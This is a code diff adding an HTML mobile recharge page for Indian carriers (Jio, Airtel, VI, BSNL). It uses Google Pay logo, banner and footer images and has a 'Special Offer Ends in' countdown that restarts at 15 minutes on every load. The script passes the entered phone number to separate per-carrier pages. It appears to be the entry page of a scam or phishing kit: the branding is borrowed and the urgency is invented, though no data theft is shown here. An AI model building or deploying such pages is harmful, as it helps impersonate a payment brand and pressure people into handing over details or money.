@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Recharge Page</title>
+    <link rel="stylesheet" href="styless.css"> <!-- Link to the CSS file -->
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+
+        <div class="hamburger">
+
+            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="50" height="30" viewBox="0 0 72 72"
+style="fill:#228BE6;">
+<path d="M56 48c2.209 0 4 1.791 4 4 0 2.209-1.791 4-4 4-1.202 0-38.798 0-40 0-2.209 0-4-1.791-4-4 0-2.209 1.791-4 4-4C17.202 48 54.798 48 56 48zM56 32c2.209 0 4 1.791 4 4 0 2.209-1.791 4-4 4-1.202 0-38.798 0-40 0-2.209 0-4-1.791-4-4 0-2.209 1.791-4 4-4C17.202 32 54.798 32 56 32zM56 16c2.209 0 4 1.791 4 4 0 2.209-1.791 4-4 4-1.202 0-38.798 0-40 0-2.209 0-4-1.791-4-4 0-2.209 1.791-4 4-4C17.202 16 54.798 16 56 16z"></path>
+</svg>
+        </div>
+
+    <a href="#">
+        <img src="/static/gpaylogo.a859e7ad6e3a2b75843f.png" alt="logo" class="logo">
+    </a>
+    </nav>
+
+    <!-- Header Image (Banner) -->
+    <div class="header-banner">
+        <img src="/static/gpaybanner.7eef6b2d81d4cc1cbede.png" alt="Recharge Offer Banner"> <!-- Replace with your header image -->
+    </div>
+
+
+    <section class="banner">
+        Special Offer Ends in: <img src="/static/time.png"> <span id="timer">15:00</span>
+    </section>
+    
+
+    <!-- Card Section -->
+    <div class="card-container">
+        <div class="recharge-card">
+            <h2>Mobile Recharge</h2>
+            
+            <div class="network-selection">
+                <label>Select Network Provider</label>
+                <div class="network-options">
+                    <label class="network-option">
+                        <input type="radio" name="network" value="jio" checked> Jio
+                    </label>
+                    <label class="network-option">
+                        <input type="radio" name="network" value="airtel"> Airtel
+                    </label>
+                    <label class="network-option">
+                        <input type="radio" name="network" value="vi"> VI
+                    </label>
+                    <label class="network-option">
+                        <input type="radio" name="network" value="bsnl"> BSNL
+                    </label>
+                </div>
+            </div>
+
+            <div class="mobile-number-section">
+                <label for="mobile-number">Mobile Number</label>
+                <input type="text" id="mobile-number" placeholder="+91 XXXXXXXXXX" maxlength="10" oninput="validateInput(this)" autocomplete="off">
+                <span id="error-message" style="color: red; display: none;"></span> <!-- Error message -->
+            </div>
+
+            <button class="recharge-button" id="submitBtn">Recharge</button>
+        </div>
+    </div>
+
+    <!-- Footer Image -->
+    <div class="footer-banner">
+        <img src="/static/gpayfooter.11f558d98dc0e11b50d8.webp" alt="Google Pay Footer"> <!-- Replace with your footer image -->
+    </div>
+
+
+    <script>
+        // Mobile number redirect
+        function validateInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, '').slice(0, 10);
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const mobileNumber = document.getElementById('mobile-number').value;
+            const errorMessage = document.getElementById('error-message'); // Get the error message element
+
+            // Reset error message
+            errorMessage.style.display = 'none';
+            errorMessage.textContent = '';
+
+            // Get the selected network provider
+            const selectedNetwork = document.querySelector('input[name="network"]:checked').value;
+
+            if (mobileNumber.length === 10) {
+                // Redirect based on the selected network provider
+                switch (selectedNetwork) {
+                    case 'jio':
+                        window.location.href = `first.html?mobile=${mobileNumber}`; // Redirect to Jio page
+                        break;
+                    case 'airtel':
+                        window.location.href = `airtel.html?mobile=${mobileNumber}`; // Redirect to Airtel page
+                        break;
+                    case 'vi':
+                        window.location.href = `vi.html?mobile=${mobileNumber}`; // Redirect to VI page
+                        break;
+                    case 'bsnl':
+                        window.location.href = `bsnl.html?mobile=${mobileNumber}`; // Redirect to BSNL page
+                        break;
+                    default:
+                        break;
+                }
+            } else {
+                // Show error message below input
+                errorMessage.textContent = 'Please enter a valid mobile number!';
+                errorMessage.style.display = 'block'; // Show the error message
+            }
+        });
+
+            
+        // < -------------------------------------------------------------------------------------------------------------------------->
+
+
+        // Set the initial time in seconds (15 minutes = 900 seconds)
+        let timeLeft = 15 * 60;
+    
+        // Function to start the countdown
+        function startCountdown() {
+            const timerElement = document.getElementById("timer");
+    
+            // Update the countdown every second
+            const countdownInterval = setInterval(() => {
+                // Calculate the minutes and seconds
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+    
+                // Add a leading zero to seconds if necessary
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+    
+                // Update the display
+                timerElement.textContent = `${minutes}:${seconds}`;
+    
+                // Decrease the time
+                timeLeft--;
+    
+                // Stop the countdown when time is up
+                if (timeLeft < 0) {
+                    clearInterval(countdownInterval);
+                    timerElement.textContent = "00:00"; // Timer ends at 00:00
+                }
+            }, 1000); // Update every second
+        }
+    
+        // Start the countdown when the page loads
+        window.onload = startCountdown;
+    </script>
+    
+</body>
+</html>
